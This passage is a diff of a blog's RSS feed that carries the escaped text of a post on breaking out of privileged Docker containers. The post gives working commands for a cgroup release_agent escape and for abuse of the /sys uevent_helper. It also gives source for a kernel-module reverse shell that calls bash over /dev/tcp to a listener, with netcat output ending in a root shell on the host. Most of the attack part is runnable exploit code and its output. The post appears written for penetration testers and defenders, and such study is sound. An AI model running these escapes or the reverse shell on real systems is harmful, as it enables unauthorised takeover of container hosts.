+&lt;li&gt;&lt;a href=&#34;https://twitter.com/jessfraz&#34;&gt;Jessie Frazelle&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://twitter.com/antitree&#34;&gt;Mark Manning&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://twitter.com/uchi_mata&#34;&gt;Matthias Luft&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://twitter.com/raesene&#34;&gt;Rory McCune&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;To name a few – you are awesome – please continue !!&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>Container Breakouts – Part 2: Privileged Container</title>
+      <link>http://nodyhub.github.io/posts/container-breakouts-part2/</link>
+      <pubDate>Tue, 21 Jul 2020 15:42:19 +0200</pubDate>
+      
+      <guid>http://nodyhub.github.io/posts/container-breakouts-part2/</guid>
+      <description>&lt;p&gt;This post is part of a series and shows container breakout techniques that can be performed if a container is started privileged.&lt;/p&gt;
+&lt;p&gt;The following posts are part of the series:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;../container-breakouts-part1&#34;&gt;Part 1: Access to root directory of the Host&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Part 2: Privileged Container&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;../container-breakouts-part3&#34;&gt;Part 3: Docker Socket&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
+&lt;p&gt;This is the second post of my container breakout series. After the discussion on how to escape from a system with access only to the root directory, we will now dive into the privileged container. The escalation itself is this time a bit more OpSec-safe then the previous, but still a bit noisy. The proposed techniques are now more container related, then the previous post.&lt;/p&gt;
+&lt;h2 id=&#34;privileged-container&#34;&gt;Privileged Container&lt;/h2&gt;
+&lt;p&gt;If you start a container with Docker and you add the flag &lt;code&gt;--privileged&lt;/code&gt; that means to the process in the container can act as root user on the host. The containerization would have the advantage of self-containing software deployment, but &lt;strong&gt;no&lt;/strong&gt; real &lt;strong&gt;security boundaries to&lt;/strong&gt; the &lt;strong&gt;kernel&lt;/strong&gt; when started with that flag.&lt;/p&gt;
+&lt;p&gt;There are multiple ways to escape from a privileged container. Let us have a look&amp;hellip;&lt;/p&gt;
+&lt;h3 id=&#34;capabilities&#34;&gt;Capabilities&lt;/h3&gt;
+&lt;p&gt;We will now explore two techniques that can be used to break out of the container. It is important to note here that it is only possible to abuse the &lt;a href=&#34;https://man7.org/linux/man-pages/man7/capabilities.7.html&#34;&gt;capabilities&lt;/a&gt;, because there is no &lt;a href=&#34;https://man7.org/linux/man-pages/man2/seccomp.2.html&#34;&gt;seccop&lt;/a&gt; filter in place. This is the case if a container is started with &lt;code&gt;--privileged&lt;/code&gt;. Docker containers are normally started with a seccomp filter enabled and give an additional layer of security.&lt;/p&gt;
+&lt;p&gt;The available capabilities inside the container can be printed with the command &lt;code&gt;capsh --print&lt;/code&gt;. The details about each capability can be taken from the man page (&lt;code&gt;man capavilities&lt;/code&gt;). In case of a privileged container, all capabilities are available. An example output looks like following:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;~# capsh --print
+Current: &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip
+Bounding set &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
+Securebits: 00/0x0/1&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;b0
+ secure-noroot: no &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;unlocked&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+ secure-no-suid-fixup: no &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;unlocked&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+ secure-keep-caps: no &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;unlocked&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+uid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+gid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+groups&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;An alternative location to get details about the process capabilities can be taken from &lt;code&gt;/proc/self/status&lt;/code&gt;, as following (thanks to &lt;a href=&#34;https://twitter.com/brompwnie&#34;&gt;Chris le Roy&lt;/a&gt; for one of the latest tweets):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;user@ca719daf3844:~$ grep Cap /proc/self/status
+CapInh:	0000003fffffffff
+CapPrm:	&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;
+CapEff:	&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;
+CapBnd:	0000003fffffffff
+CapAmb:	&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt;
+
+user@ca719daf3844:~$ capsh --decode&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0000003fffffffff
+0x0000003fffffffff&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A detailed summary of sensitive kernel capabilities can be taken from the forum &lt;a href=&#34;https://grsecurity.net/&#34;&gt;grsecurity&lt;/a&gt; post from spender &lt;a href=&#34;https://forums.grsecurity.net/viewtopic.php?t=2522&#34;&gt;False Boundaries and Arbitrary Code Execution&lt;/a&gt;.&lt;/p&gt;
+&lt;h4 id=&#34;cap_sys_admin--cgroup-notify-on-release-escape&#34;&gt;&lt;code&gt;CAP_SYS_ADMIN&lt;/code&gt; – cgroup notify on release escape&lt;/h4&gt;
+&lt;p&gt;One of the dangerous kernel capabilities is &lt;code&gt;CAP_SYS_ADMIN&lt;/code&gt;. If you are acting in a container with this capability, you can manage cgroups of the system. As a short re-cap – &lt;a href=&#34;https://man7.org/linux/man-pages/man7/cgroups.7.html&#34;&gt;cgroups&lt;/a&gt; are used to manage the system resources for a container (that’s very brief – I know).&lt;/p&gt;
+&lt;p&gt;In this escape, we use a &lt;strong&gt;feature of cgroups&lt;/strong&gt; that allows the &lt;strong&gt;execution&lt;/strong&gt; of code &lt;strong&gt;in&lt;/strong&gt; the &lt;strong&gt;root context&lt;/strong&gt;, after the last process in a cgroup is terminated. The feature is called &lt;strong&gt;“notification on release”&lt;/strong&gt; and can only be set, because we have the capability &lt;code&gt;CAP_SYS_ADMIN&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;This technique got popular after &lt;a href=&#34;https://twitter.com/_fel1x&#34;&gt;Felix Wilhelm&lt;/a&gt; from &lt;a href=&#34;https://googleprojectzero.blogspot.com/&#34;&gt;Google Project Zero&lt;/a&gt; put the escape in one tweet. &lt;a href=&#34;https://www.trailofbits.com/&#34;&gt;Trail of Bits&lt;/a&gt; has even investigated further this topic and all details can be read in their blogpost &lt;a href=&#34;https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/&#34;&gt;Understanding Docker container escapes&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Here is just the quintessence of this approach:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Create a new cgroup&lt;/li&gt;
+&lt;li&gt;Create and activate “callback” with &lt;code&gt;notify_on_release&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Create an ephemeral process in new cgroup to trigger “callback”&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;The following commands are necessary to perform the attack:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;~# mkdir /tmp/cgrp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; mount -t cgroup -o rdma cgroup /tmp/cgrp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; mkdir /tmp/cgrp/escape_cgroup
+
+~# echo &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &amp;gt; /tmp/cgrp/escape_cgroup/notify_on_release
+~# host_path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;sed -n &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/.*\perdir=\([^,]*\).*/\1/p&amp;#39;&lt;/span&gt; /etc/mtab&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
+~# echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$host_path&lt;span style=&#34;color:#e6db74&#34;&gt;/cmd&amp;#34;&lt;/span&gt; &amp;gt; /tmp/cgrp/release_agent
+
+~# echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;#!/bin/sh&amp;#39;&lt;/span&gt; &amp;gt; /cmd
+~# echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ps aux | /sbin/tee &lt;/span&gt;$host_path&lt;span style=&#34;color:#e6db74&#34;&gt;/cmdout&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /cmd
+~# chmod a+x /cmd
+
+~# sh -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;echo 0 &amp;gt; /tmp/cgrp/escape_cgroup/cgroup.procs&amp;#34;&lt;/span&gt; 
+~# sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+~# head /cmdout
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;  0.0  0.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;108272&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11216&lt;/span&gt; ?        Ss   20:57   0:00 /sbin/init
+root           &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;  0.0  0.0      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ?        S    20:57   0:00 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;kthreadd&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+root           &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;  0.0  0.0      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ?        I&amp;lt;   20:57   0:00 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rcu_gp&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+root           &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;  0.0  0.0      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ?        I&amp;lt;   20:57   0:00 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rcu_par_gp&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+root           &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;  0.0  0.0      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ?        I&amp;lt;   20:57   0:00 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;kworker/0:0H-kblockd&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+root           &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;  0.0  0.0      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ?        I    20:57   0:00 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;kworker/u8:0-events_power_efficient&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+root           &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;  0.0  0.0      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ?        I&amp;lt;   20:57   0:00 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;mm_percpu_wq&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+root           &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;  0.0  0.0      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ?        S    20:57   0:00 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ksoftirqd/0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+root          &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;  0.0  0.0      &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;     &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; ?        S    20:57   0:00 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rcuc/0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To by honest, this &lt;strong&gt;technique&lt;/strong&gt; was in my setup &lt;strong&gt;a bit flaky&lt;/strong&gt; and I had some issues while repeating it. Do not worry if it is not working on the first try.&lt;/p&gt;
+&lt;h4 id=&#34;cap_sys_module--load-kernel-module&#34;&gt;&lt;code&gt;CAP_SYS_Module&lt;/code&gt; – Load Kernel Module&lt;/h4&gt;
+&lt;p&gt;What do you need to &lt;strong&gt;load a kernel module on a Unix host&lt;/strong&gt;? Exact, the right capability: &lt;code&gt;CAP_SYS_MODULE&lt;/code&gt;. In advance, you &lt;strong&gt;must&lt;/strong&gt; be in the &lt;strong&gt;same process namespace as&lt;/strong&gt; the &lt;strong&gt;init&lt;/strong&gt; process, but &lt;strong&gt;that is default&lt;/strong&gt; in case of plain Docker setups. You think now &lt;em&gt;how dare you&lt;/em&gt; this is something nobody would do!? That is exactly what happened to &lt;em&gt;Play-with-Docker&lt;/em&gt;. I recommend reading the post &lt;a href=&#34;https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host&#34;&gt;How I Hacked Play-with-Docker and Remotely Ran Code on the Host&lt;/a&gt; by &lt;a href=&#34;https://twitter.com/n1mr0d5&#34;&gt;Nimrod Stoler&lt;/a&gt; to get all insights and the full picture.&lt;/p&gt;
+&lt;p&gt;The exploitation cannot be that easily weaponized, because we need a &lt;strong&gt;kernel module&lt;/strong&gt; that &lt;strong&gt;fits&lt;/strong&gt; the &lt;strong&gt;kernel version&lt;/strong&gt;. To do so, we need to &lt;strong&gt;compile&lt;/strong&gt; our own &lt;strong&gt;kernel module&lt;/strong&gt; for the host system kerne. I thought initially that’s an easy one, just &lt;em&gt;copy&amp;amp;paste&lt;/em&gt; the code, compile and finished. Sounds easy? It is not that easy if you have an Ubuntu container on an Archlinux host – sigh.&lt;/p&gt;
+&lt;p&gt;To perform the steps I had to cheat a bit. Previously, we have performed all steps from inside the container. This time, I will &lt;strong&gt;pre-compile&lt;/strong&gt; the &lt;strong&gt;kernel module outside&lt;/strong&gt; of the &lt;strong&gt;container&lt;/strong&gt;. Why is that necessary in my case? Because I had issues to compile the kernel module for the Archlinux kernel inside an ubuntu container with the Ubuntu toolchain. I am not a kernel developer, so I dropped to dive into the issues and let someone with more expertise to deep-dive on that topic.&lt;/p&gt;
+&lt;p&gt;To &lt;strong&gt;prepare&lt;/strong&gt; the &lt;strong&gt;kernel module&lt;/strong&gt;, you &lt;strong&gt;need&lt;/strong&gt; the &lt;strong&gt;kernel headers&lt;/strong&gt; for the host that runs the container. You can find them while googling through the internet and search for the kernel version headers (kernel version can be identified by &lt;code&gt;uname -r&lt;/code&gt;). Afterward, you need the &lt;em&gt;gcc&lt;/em&gt; compiler and &lt;em&gt;make&lt;/em&gt; and that’s it.&lt;/p&gt;
+&lt;p&gt;The following steps have been performed on a separate host (an ubuntu system).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;~# apt update &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt install -y gcc make linux-headers 
+
+~# cat &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;&amp;lt; EOF &amp;gt; reverse-shell.c
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#include &amp;lt;linux/kmod.h&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#include &amp;lt;linux/module.h&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;MODULE_AUTHOR(&amp;#34;AttackDefense&amp;#34;);
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;MODULE_DESCRIPTION(&amp;#34;LKM reverse shell module&amp;#34;);
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;MODULE_VERSION(&amp;#34;1.0&amp;#34;);
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;char* argv[] = {&amp;#34;/bin/bash&amp;#34;,&amp;#34;-c&amp;#34;,&amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/172.17.0.2/1337 0&amp;gt;&amp;amp;1&amp;#34;, NULL};
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;static char* envp[] = {&amp;#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&amp;#34;, NULL };
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;static int __init reverse_shell_init(void) {
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;static void __exit reverse_shell_exit(void) {
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;printk(KERN_INFO &amp;#34;Exiting\n&amp;#34;);
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;module_init(reverse_shell_init);
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;module_exit(reverse_shell_exit);
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;EOF&lt;/span&gt;
+
+~# cat Makefile
+obj-m +&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;reverse-shell.o
+all:
+	make -C /lib/modules/&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;uname -r&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;/build M&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;pwd&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; modules
+clean:
+	make -C /lib/modules/&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;uname -r&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;/build M&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;pwd&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; clean
+
+~# make
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After the &lt;strong&gt;kernel module&lt;/strong&gt; is &lt;strong&gt;prepared&lt;/strong&gt;, the binary is &lt;strong&gt;transferred to&lt;/strong&gt; the privileged &lt;strong&gt;container&lt;/strong&gt;. This can be Base64-encoded (in my case 86 lines) or another transfer technique. With the binary transferred into the container, we can start in the &lt;strong&gt;listener&lt;/strong&gt; for the &lt;strong&gt;reverse shell&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Terminal 1&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;~# nc -lvlp &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;
+listening on &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;any&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt; ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Terminal 1 must be on a system that is accessible from the host, that serves the container. The listener can even be started inside the container.  If the listener is ready, the kernel module can be loaded, and the host will initiate the reverse shell.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Terminal 2&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;~# insmod reverse-shell.ko
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And that’s it!&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Terminal 1&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;~# nc -lvlp &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;
+listening on &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;any&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt; ...
+
+172.17.0.1: inverse host lookup failed: Unknown host
+connect to &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;172.17.0.2&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; from &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;UNKNOWN&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;172.17.0.1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55010&lt;/span&gt;
+bash: cannot set terminal process group &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;-1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; device
+bash: no job control in this shell
+root@linux-box:/#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A more detailed explanation can be found here &lt;a href=&#34;https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd&#34;&gt;Docker Container Breakout: Abusing SYS_MODULE capability!&lt;/a&gt; by &lt;a href=&#34;https://linkedin.com/in/wifisecguy/&#34;&gt;Nishant Sharma&lt;/a&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;linux-kernel-filesystem-sys&#34;&gt;Linux kernel Filesystem &lt;code&gt;/sys&lt;/code&gt;&lt;/h3&gt;
+&lt;p&gt;The Linux kernel offers access over the filesystem &lt;code&gt;/sys&lt;/code&gt; direct access to the kernel. In case you are root – what we are in a privileged container – you can trigger events that got consumed and processed by the kernel. One of the interfaces is the &lt;code&gt;uevent_helper&lt;/code&gt; which is a callback that is triggered as soon a new device is plugged in the system. The plugin a new device can be simulated as well by the &lt;code&gt;/sys&lt;/code&gt; filesystem.&lt;/p&gt;
+&lt;p&gt;An example to execute commands on the host system is as follows:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Create “callback”&lt;/li&gt;
+&lt;li&gt;Link “callback”&lt;/li&gt;
+&lt;li&gt;Trigger “callback”&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;~# host_path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;sed -n &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/.*\perdir=\([^,]*\).*/\1/p&amp;#39;&lt;/span&gt; /etc/mtab&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
+
+~# cat &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;&amp;lt; EOF &amp;gt; /trigger.sh
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#!/bin/sh  
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ps auxf &amp;gt; $host_path/output.txt
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;EOF&lt;/span&gt;
+
+~# chmod +x /trigger.sh 
+
+~# echo $host_path/trigger.sh &amp;gt; /sys/kernel/uevent_helper
+
+~# echo change &amp;gt; /sys/class/mem/null/uevent
+
+~# head /output.txt
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
